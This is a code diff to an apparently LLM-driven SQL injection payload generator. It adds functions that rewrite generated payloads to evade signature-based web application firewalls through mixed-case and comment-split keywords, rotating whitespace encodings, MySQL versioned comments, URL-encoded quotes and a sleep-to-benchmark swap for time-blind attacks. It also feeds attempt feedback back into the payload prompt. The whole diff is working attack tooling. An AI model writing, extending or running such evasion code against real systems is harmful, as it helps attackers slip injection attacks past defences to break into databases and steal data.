@@ -36,6 +36,23 @@ _USER_TEMPLATE = (
     "- Required technique: {strategy}\n\n"
     "Return one {strategy} SQL injection payload for {database}."
 )
+
+
+def _insert_inline_comments(token: str) -> str:
+    chars = [c for c in token if c.isalnum()]
+    if len(chars) < 4:
+        return token
+    return "/**/".join(chars)
+
+
+def _mixed_case(token: str, rng: random.Random) -> str:
+    out = []
+    for ch in token:
+        if ch.isalpha():
+            out.append(ch.upper() if rng.random() < 0.5 else ch.lower())
+        else:
+            out.append(ch)
+    return "".join(out)
 # -- offline fallback payload templates (already lightly obfuscated) --------- #
 _OFFLINE_TEMPLATES: Dict[str, list] = {
     "union_based": [
@@ -93,7 +110,13 @@ class PayloadGenerator:
         self.offline_used = 0
         self.use_cache = use_cache
 
-    def generate(self, strategy: str, context: Dict[str, str], attempt: int = 0) -> str:
+    def generate(
+        self,
+        strategy: str,
+        context: Dict[str, str],
+        attempt: int = 0,
+        feedback: str = "",
+    ) -> str:
         variation = ""
         if attempt > 0:
             variation = (
@@ -101,6 +124,8 @@ class PayloadGenerator:
                 f"using different obfuscation/encoding than earlier attempts to better evade "
                 f"signature-based WAFs."
             )
+        if feedback:
+            variation += f"\nPrevious attempt feedback: {feedback}."
         user = _USER_TEMPLATE.format(strategy=strategy, **context) + variation
         content = self.client.chat(
             model=self.cfg.payload_model,
@@ -112,7 +137,54 @@ class PayloadGenerator:
         payload = _clean_payload(content) if content else ""
         if not payload:
             payload = self._offline(strategy)
+        if str(context.get("waf", "")).lower() in {"present", "true", "1", "yes"}:
+            payload = self._harden_for_waf(payload, strategy=strategy, context=context, attempt=attempt)
         return payload
+
+    def _harden_for_waf(self, payload: str, strategy: str, context: Dict[str, str], attempt: int) -> str:
+        """Apply deterministic polymorphic rewrites for signature-based WAF evasion."""
+        if not payload:
+            return payload
+
+        db = str(context.get("database", "mysql")).lower()
+        p = payload[:512]
+
+        # Rotate whitespace/comment style per attempt for diversity.
+        separators = ["/**/", "%0a", "%09"]
+        sep = separators[attempt % len(separators)]
+        p = re.sub(r"\s+", sep, p)
+
+        keyword_patterns = [
+            r"union", r"select", r"from", r"where", r"and", r"or", r"sleep",
+            r"benchmark", r"extractvalue", r"updatexml", r"information_schema", r"concat",
+        ]
+
+        def keyword_rewriter(match: re.Match) -> str:
+            kw = match.group(0)
+            mode = attempt % 3
+            if mode == 0:
+                return _mixed_case(kw, self._rng)
+            if mode == 1:
+                return _insert_inline_comments(kw)
+            # MySQL versioned comments are often useful for bypassing filters.
+            if db == "mysql":
+                return f"/*!50000{kw.upper()}*/"
+            return _mixed_case(kw, self._rng)
+
+        for pat in keyword_patterns:
+            p = re.sub(rf"\b{pat}\b", keyword_rewriter, p, flags=re.I)
+
+        # Rotate quoting/comment variants to avoid static signatures.
+        if attempt % 2 == 1:
+            p = p.replace("'", "%27")
+        if "--" in p and attempt % 2 == 0:
+            p = p.replace("--", "%23")
+
+        # Encourage time-based bypass alternatives that commonly evade filters.
+        if strategy == "time_blind" and "sleep" in p.lower() and db == "mysql":
+            p = re.sub(r"sleep\s*\(\s*(\d+)\s*\)", r"benchmark(\g<1>00000,md5(1))", p, flags=re.I)
+
+        return p[:512]
 
     def _offline(self, strategy: str) -> str:
         self.offline_used += 1
